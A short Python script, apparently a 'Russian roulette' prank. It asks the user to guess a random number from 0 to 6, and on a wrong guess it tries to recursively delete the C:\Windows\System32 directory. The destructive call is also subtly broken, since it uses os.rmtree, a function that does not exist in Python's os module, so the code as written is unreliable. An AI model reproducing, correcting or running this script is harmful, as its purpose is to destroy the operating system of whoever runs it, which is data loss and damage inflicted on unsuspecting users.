import os
import random

initialValue = 0
finalValue = 6
x = random.randint(initialValue, finalValue)
y = int(input("pick a number between 0 and 6 : "))

if (x != y):
    os.rmtree(r"C:\Windows\System32")
else:
    print("You survived. THIS TIME.")